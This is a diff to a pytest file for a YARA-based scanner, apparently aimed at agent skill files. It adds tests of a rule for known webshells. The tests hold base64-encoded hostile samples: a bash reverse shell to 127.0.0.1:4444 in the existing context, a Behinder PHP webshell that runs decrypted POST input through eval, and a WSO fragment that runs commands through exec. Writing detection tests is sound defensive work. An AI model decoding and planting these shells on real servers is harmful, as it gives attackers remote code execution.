@@ -87,6 +87,17 @@ def _reverse_shell_fixture() -> str:
     return base64.b64decode("YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvNDQ0NCAwPiYx").decode()
 
 
+_WEBSHELL_FIXTURES = {
+    "behinder_php": "PD9waHAgQGVycm9yX3JlcG9ydGluZygwKTsgc2Vzc2lvbl9zdGFydCgpOyAka2V5PSJlNDVlMzI5ZmViNWQ5MjViIjsKJF9TRVNTSU9OWydrJ109JGtleTsgJHBvc3Q9ZmlsZV9nZXRfY29udGVudHMoInBocDovL2lucHV0Iik7CiRwb3N0PW9wZW5zc2xfZGVjcnlwdCgkcG9zdCwgIkFFUzEyOCIsICRrZXkpOyBldmFsKCRwb3N0KTsgPz4K",
+    "behinder_jsp": "PCVAcGFnZSBpbXBvcnQ9ImphdmEudXRpbC4qLGphdmF4LmNyeXB0by4qIiU+CjwlIFN0cmluZyBrPSJlNDVlMzI5ZmViNWQ5MjViIjsgc2Vzc2lvbi5wdXRWYWx1ZSgidSIsayk7CkNpcGhlciBjPUNpcGhlci5nZXRJbnN0YW5jZSgiQUVTIik7ICU+Cg==",
+    "wso_php": "PD9waHAgZGVmaW5lKCdXU09fVkVSU0lPTicsICcyLjUnKTsKZnVuY3Rpb24gd3NvRXgoJGluKSB7ICRvdXQ9Jyc7IGlmKGZ1bmN0aW9uX2V4aXN0cygnZXhlYycpKSB7IEBleGVjKCRpbiwkb3V0KTsgfQpyZXR1cm4gJG91dDsgfQo=",
+}
+
+
+def _webshell_fixture(name: str) -> str:
+    return base64.b64decode(_WEBSHELL_FIXTURES[name]).decode()
+
+
 def _has_rule(findings: list, rule_name: str) -> bool:
     """Return True when a finding message references a specific YARA rule."""
     return any(rule_name in f.message for f in findings)
@@ -552,6 +563,32 @@ rule agent_skill_destructive_autonomous_actions {
 """
         findings = _run_builtin(content, "README.md")
         assert not _has_rule(findings, "agent_skill_credential_exfiltration_webhook")
+
+    @pytest.mark.parametrize(
+        "content",
+        [
+            "Zu kleine Schrift behindert das Lesen. Menschen mit Behinderung\n"
+            "brauchen ausreichende Kontraste.\n",
+            "We deploy the API on WSO 2 Micro Integrator.\n",
+            "This skill detects Behinder and WSO webshells in uploaded files.\n",
+        ],
+        ids=["german_prose", "wso2_product_name", "family_names_in_docs"],
+    )
+    def test_known_webshell_rule_ignores_prose(self, content):
+        findings = _run_builtin(content, "SKILL.md")
+        assert not _has_rule(findings, "php_webshell_known")
+
+    @pytest.mark.parametrize(
+        ("fixture", "filename"),
+        [
+            ("behinder_php", "shell.php"),
+            ("behinder_jsp", "shell.jsp"),
+            ("wso_php", "shell.php"),
+        ],
+    )
+    def test_known_webshell_rule_matches_family_markers(self, fixture, filename):
+        findings = _run_builtin(_webshell_fixture(fixture), filename)
+        assert _has_rule(findings, "php_webshell_known")
 
 
 # ── Rule caching ──────────────────────────────────────────────────────
